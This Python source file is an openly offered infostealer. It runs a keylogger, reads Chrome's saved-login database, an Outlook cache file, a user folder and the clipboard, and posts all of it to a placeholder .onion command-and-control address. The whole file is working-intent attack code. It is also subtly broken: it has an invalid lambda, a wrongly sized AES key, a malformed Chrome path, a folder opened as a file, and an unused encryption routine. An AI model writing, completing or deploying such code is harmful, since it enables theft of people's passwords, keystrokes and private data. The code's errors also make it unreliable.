import os
import sys
import time
import threading
from cryptography.hazmat.primitives import hashes, serialization, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import sqlite3
import json
import requests

# === CONFIGURATION ===
C2_SERVER = "http://youronionaddress.onion/steal"  # Replace with your C2 address
ENCRYPTION_KEY = b"Your123SecretKeyHere"  # 16-byte key for AES-128

# === KEYLOGGER ===
def keylogger():
    import keyboard
    log = ""
    while True:
        try:
            # Capture keystrokes
            keyboard.on_press(lambda e: log += e.name + " ")
            time.sleep(1)
            # Send logs to C2
            requests.post(C2_SERVER, data={"type": "keys", "data": log})
            log = ""
        except Exception:
            pass

# === STEAL CHROME PASSWORDS ===
def steal_chrome():
    chrome_profile = os.path.join(os.getenv("APPDATA"), "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    if os.path.exists(chrome_profile):
        conn = sqlite3.connect(chrome_profile)
        cursor = conn.cursor()
        cursor.execute("SELECT origin, action, username_value, password_value FROM logins")
        passwords = cursor.fetchall()
        conn.close()
        for origin, action, username, password in passwords:
            try:
                requests.post(C2_SERVER, data={"type": "chrome", "origin": origin, "username": username, "password": password})
            except:
                pass

# === STEAL OUTLOOK PASSWORDS ===
def steal_outlook():
    outlook_profile = os.path.join(os.getenv("APPDATA"), "Microsoft", "Outlook", "RoamCache", "Outlook.rsp")
    if os.path.exists(outlook_profile):
        with open(outlook_profile, "r") as f:
            data = f.read()
        requests.post(C2_SERVER, data={"type": "outlook", "data": data})

# === STEAL WIN10 CREDENTIALS ===
def steal_win10():
    if sys.platform == 'win32':
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\ShellFolders")
        profile_path = winreg.QueryValueEx(key, "Personal")[-1]
        winreg.CloseKey(key)
        if os.path.exists(profile_path):
            with open(profile_path, "r") as f:
                data = f.read()
            requests.post(C2_SERVER, data={"type": "win10", "data": data})

# === STEAL CLIPBOARD ===
def steal_clipboard():
    import pyperclip
    while True:
        try:
            data = pyperclip.paste()
            if data:
                requests.post(C2_SERVER, data={"type": "clipboard", "data": data})
                time.sleep(5)
        except:
            pass

# === ENCRYPT DATA ===
def encrypt_data(data):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data.encode()) + padder.finalize()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return iv + ciphertext

# === MAIN ===
def main():
    # Run keylogger in background
    threading.Thread(target=keylogger, daemon=True).start()
    # Steal Chrome passwords
    steal_chrome()
    # Steal Outlook passwords
    steal_outlook()
    # Steal Win10 credentials
    steal_win10()
    # Steal clipboard
    steal_clipboard()

if __name__ == "__main__":
    main()
